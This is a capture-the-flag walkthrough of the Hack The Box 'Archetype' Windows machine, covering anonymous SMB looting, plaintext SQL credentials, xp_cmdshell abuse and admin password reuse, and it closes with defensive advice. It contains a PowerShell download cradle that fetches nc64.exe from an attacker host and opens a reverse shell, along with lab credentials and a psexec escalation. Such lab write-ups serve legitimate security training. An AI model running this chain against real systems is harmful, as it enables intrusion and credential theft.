# HTB Archetype — Full Writeup

**Platform:** Hack The Box
**Difficulty:** Very Easy
**OS:** Windows
**Season:** Starting Point Tier II

---

## Overview

Archetype is a Starting Point Tier II Windows box that chains a classic SMB misconfiguration into MSSQL abuse and credential reuse. An anonymous SMB session exposes a non-default `backups` share containing an SSIS configuration file (`prod.dtsConfig`) with plaintext credentials for the `sql_svc` SQL service account. Those credentials authenticate to MSSQL over Windows auth. As `sql_svc` has elevated SQL privileges, `xp_cmdshell` can be enabled and used to execute a PowerShell download-cradle, yielding a reverse shell as `sql_svc`. Post-exploitation of the user's PowerShell `ConsoleHost_history.txt` reveals the Administrator password in cleartext (`MEGACORP_4dm1n!!`), which is reused via `psexec.py` for SYSTEM on the box.

```
anonymous SMB
  -> backups share readable
    -> prod.dtsConfig -> sql_svc : M3g4c0rp123
      -> mssqlclient.py -windows-auth
        -> xp_cmdshell -> PowerShell download cradle -> nc64.exe reverse shell (sql_svc)
          -> ConsoleHost_history.txt -> administrator : MEGACORP_4dm1n!!
            -> psexec.py administrator -> SYSTEM
```

---

## Reconnaissance

### Port Scan

```bash
nmap -Pn -sC -sV -p- 10.129.95.187
```

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server
1433/tcp  open  ms-sql-s      Microsoft SQL Server
5985/tcp  open  wsman         WinRM
47001/tcp open  winrm
49664-49669/tcp open  unknown (RPC dynamic)
```

Key observations:

* SMB (139/445) is open — enumerate shares anonymously.
* MSSQL (1433) is directly exposed to the network.
* WinRM (5985) is available — useful once credentials are obtained.

### SMB Enumeration

List shares anonymously:

```bash
smbclient -N -L \\\\10.129.95.187\\
```

```
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    backups         Disk
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
```

The non-default `backups` share is readable without authentication.

---

## Initial Access

### 1. Loot the backups share

```bash
smbclient -N \\\\10.129.95.187\\backups
```

```
smb: \> dir
  .                                   D        0  Mon Jan 20 04:20:57 2020
  ..                                  D        0  Mon Jan 20 04:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 04:23:02 2020
smb: \> get prod.dtsConfig
```

### 2. Extract SQL service credentials

`prod.dtsConfig` is an SSIS package configuration file containing a plaintext SQL connection string:

```xml
<Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
    <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
</Configuration>
```

Recovered credentials: `ARCHETYPE\sql_svc : M3g4c0rp123`.

### 3. Authenticate to MSSQL

```bash
impacket-mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
```

### 4. Enable xp_cmdshell

The `sql_svc` account has sufficient server-level privileges to re-enable command execution via `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Verify:

```sql
EXEC xp_cmdshell 'whoami';
```

```
archetype\sql_svc
```

### 5. Stage payload and reverse shell

On the attacker (`ATTACKER_IP = 10.10.15.8`):

```bash
# Serve nc64.exe
python3 -m http.server 80

# Listener
nc -lvnp 443
```

From the MSSQL session, execute a PowerShell download cradle and callback:

```sql
EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; wget http://ATTACKER_IP/nc64.exe -outfile nc64.exe; .\nc64.exe -e cmd.exe ATTACKER_IP 443"';
```

A shell lands as `ARCHETYPE\sql_svc`.

### User flag

```cmd
type C:\Users\sql_svc\Desktop\user.txt
```

---

## Privilege Escalation

### 1. Read PowerShell history

```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

An administrator had previously mapped the `backups` share using `net use`, writing the cleartext Administrator password to `ConsoleHost_history.txt`.

### 2. Reuse Administrator credentials

Confirm the credentials with `psexec.py` to drop straight to SYSTEM:

```bash
impacket-psexec.py administrator@10.129.95.187
```

```
[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service ... on 10.129.95.187.....
[*] Starting service .....
[!] Press help for extra shell commands
C:\Windows\system32> whoami
nt authority\system
```

### Root flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Flags

| Flag | Location |
|------|----------|
| user.txt | `C:\Users\sql_svc\Desktop\user.txt` |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` |

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port and service enumeration |
| `smbclient` | Anonymous SMB share enumeration and file retrieval |
| `impacket-mssqlclient.py` | MSSQL authentication with Windows auth |
| `xp_cmdshell` | Command execution via MSSQL |
| `nc64.exe` | Reverse shell binary |
| `impacket-psexec.py` | SYSTEM shell via SMB + service creation |

## Key Takeaways

* **Anonymous SMB share access** is a classic misconfiguration — always enumerate null sessions first. A non-default share name is a strong signal to investigate.
* **SSIS `.dtsConfig` files** frequently store plaintext database credentials. Any file found in a share with an XML configuration format deserves inspection for connection strings.
* **`xp_cmdshell`** is disabled by default but can be re-enabled by any account with the `sysadmin` or sufficient server role — service accounts are often over-privileged on SQL Server.
* **PowerShell `ConsoleHost_history.txt`** is one of the highest-value post-exploitation artifacts on Windows. `net use` with inline credentials is a common mistake that exposes plaintext passwords to anyone with read access to the user profile.
* **Defensive:** disable anonymous SMB listing, audit share permissions, use gMSAs or Managed Identities instead of long-lived service accounts, disable `xp_cmdshell`, and clear or disable PSReadline history for privileged users.
